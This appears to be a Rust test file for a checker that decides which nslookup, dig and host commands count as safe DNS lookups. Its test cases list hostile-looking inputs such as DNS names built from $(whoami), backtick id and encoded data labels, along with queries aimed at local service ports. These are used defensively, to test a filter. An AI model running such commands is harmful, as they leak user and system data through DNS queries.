use super::safe_lookup_arguments;

fn safe(command: &str) -> bool {
    let mut words = command.split_whitespace();
    let program = words.next().unwrap_or_default();
    let arguments: Vec<String> = words.map(str::to_owned).collect();
    safe_lookup_arguments(program, &arguments)
}

#[test]
fn lookups_of_a_fixed_name_are_admitted() {
    for command in [
        "nslookup example.com",
        "nslookup example.com 1.1.1.1",
        "nslookup -type=mx example.com",
        "nslookup -query=TXT -timeout=5 example.com",
        "nslookup -debug example.com",
        "nslookup 93.184.216.34",
        "dig example.com",
        "dig",
        "dig +short example.com A",
        "dig @1.1.1.1 example.com MX +noall +answer",
        "dig @ns1.example.com example.com SOA",
        "dig -t AAAA example.com",
        "dig -tAAAA -4 example.com",
        "dig -x 93.184.216.34",
        "dig -x 2606:2800:220:1:248:1893:25c8:1946",
        "dig +time=2 +tries=1 example.com.",
        "dig _dmarc.example.com TXT",
        "host example.com",
        "host -t mx example.com",
        "host -W 3 example.com 8.8.8.8",
        "host -a example.com",
        "host 93.184.216.34",
    ] {
        assert!(safe(command), "{command}");
    }
}

#[test]
fn file_key_port_and_stdin_forms_keep_their_review() {
    for command in [
        // A batch file, a key file or a key on the command line.
        "dig -f names.txt",
        "dig -k key.conf example.com",
        "dig -y hmac-sha256:name:secret example.com",
        // A port or a source address picks what the packet reaches.
        "dig -p 2375 @127.0.0.1 example.com",
        "dig -b 10.0.0.5 example.com",
        "nslookup -port=2375 example.com 127.0.0.1",
        "host -p 2375 example.com",
        // A whole zone, and options this proof does not know.
        "host -l example.com",
        "host -m record example.com",
        "dig -m example.com",
        "nslookup -silent example.com",
        // No name: nslookup reads commands from standard input.
        "nslookup",
        "nslookup -",
        "host",
        "nslookup a.example b.example c.example",
        "dig -t",
    ] {
        assert!(!safe(command), "{command}");
    }
}

#[test]
fn names_that_could_carry_data_keep_their_review() {
    for command in [
        "nslookup $(whoami).example.com",
        "dig `id`.example.com",
        "host ${HOME}.example.com",
        "dig *.example.com",
        "nslookup -leading.example.com",
        "dig 6b6e6f776e2d736563726574.6b6e6f776e2d736563726574616263646566676869.example.com",
        "dig aGVsbG8gd29ybGQgdGhpcyBpcyBhIHNlY3JldCBrZXkgdmFsdWU1234567.example.com",
        "dig @$(whoami).example.com example.com",
        "dig +opt=$(id) example.com",
        "nslookup -type=$(id) example.com",
        "dig -x $(id)",
        "nslookup ../example.com",
    ] {
        assert!(!safe(command), "{command}");
    }
}
